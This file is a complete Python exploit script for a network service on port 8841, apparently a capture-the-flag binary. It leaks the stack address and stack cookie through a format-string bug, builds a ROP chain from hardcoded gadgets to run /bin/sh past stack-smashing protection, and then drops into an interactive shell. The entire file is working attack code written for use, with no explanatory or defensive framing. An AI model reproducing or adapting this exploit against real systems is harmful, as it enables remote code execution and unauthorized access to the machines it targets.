#!/usr/bin/python

import pexpect
import sys
import time
import struct
import ctypes

prog = "nc %s 8841"
proc = None

def pack(x):
    return struct.pack("<I", x)

def readall():
    data = []
    while True:
        try:
            proc.expect('\n')
            c = proc.before
            if not c: break
            c = c.replace('\r', '\n')
            data.append(c)
        except (pexpect.TIMEOUT, pexpect.EOF) as e:
            data.append(proc.before)
            break
    return data

def interact(*params):
    out = []
    for param in params:
        proc.sendline(str(param))
        out.extend(readall())
        time.sleep(0.1)
    out.extend(readall())
    return out

def shell():
    # 0x03 is a Control-C escape code.
    proc.interact('\x03')

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage: exploit.py <IP>"
        sys.exit(0)
    else:
        prog = prog % sys.argv[1]
        print "Connecting to %s..." % sys.argv[1]

    proc = pexpect.spawn(prog, timeout=0.1 )

    print "Step 1: Leak current stack address and valid stack cookie"

    # Cookie can be obtained by displaying %130$x value via Format String leakage.
    out = interact("%x.%130$x;/bin/sh\x00".ljust(512, "H"))[9].strip()
    out = out[:out.find(';')].split('.')

    stack = int("0x" + out[0], 16)
    cookie = int("0x" + out[1], 16)

    bin_sh_addr = ctypes.c_uint32(stack).value
    bin_sh_addr -= 530
    #bin_sh_addr = 0x800147d5
    #bin_sh_addr = 0xbffff1fe
    #bin_sh_addr = 0x41414141
    
    print "\tLeaked cookie: 0x%08x" % cookie
    print "\tFake stack will be constructed at: 0x%08x" % stack
    print "\tCommand string located at: 0x%08x" % bin_sh_addr

    print "Step 2: Constructing ROP buffer to overcome Stack Smashing Protection"
    
    # 0x080e71c5 : pop ecx ; ret
    gadget1 = 0x080e71c5

    # 0x08058d56 : xor eax, eax ; pop ebx ; ret
    gadget2 = 0x08058d56

    # 0x080ea089 : add al, 2 ; inc eax ; ret
    gadget3 = 0x080ea089

    # 0x08064753 : dec eax ; ret
    gadget4 = 0x08064753

    # 0x0806f22a : pop edx ; ret
    gadget5 = 0x0806f22a

    # 0x0806f8ff : nop ; int 0x80
    gadget6 = 0x0806f8ff


    buf = "A\x00/bin/sh\x00" + "B" * (512-10)
    buf += pack(cookie)
    buf += "CCCC"
    buf += pack(gadget1)        # pop ecx
    buf += pack(0)              #   ecx value
    buf += pack(gadget2)        # pop ebx
    buf += pack(bin_sh_addr)    #   ebx value
    buf += pack(gadget3)        # add eax, 3
    buf += pack(gadget3)        # add eax, 3
    buf += pack(gadget3)        # add eax, 3
    buf += pack(gadget3)        # add eax, 3
    buf += pack(gadget4)        # dec eax
    buf += pack(gadget5)        # pop edx
    buf += pack(0)              #   edx value
    buf += pack(gadget6)        # int 0x80
    buf += "GGGG"
    buf += "A\x00"

    # Assure there are no bad characters (for scanf) in the buffer
    #assert "\x04" not in buf, "0x04 is in buffer, bad character for scanf"
    assert "\x09" not in buf, "0x09 is in buffer, bad character for scanf"
    assert "\x0a" not in buf, "0x0a is in buffer, bad character for scanf"
    assert "\x0b" not in buf, "0x0b is in buffer, bad character for scanf"
    assert "\x0c" not in buf, "0x0c is in buffer, bad character for scanf"
    assert "\x0d" not in buf, "0x0d is in buffer, bad character for scanf"
    assert "\x20" not in buf, "0x20 is in buffer, bad character for scanf"

    print "Step 3: Invoking ROP payload"
    interact(buf)

    sys.stdout.write("$ ")
    proc.interact()

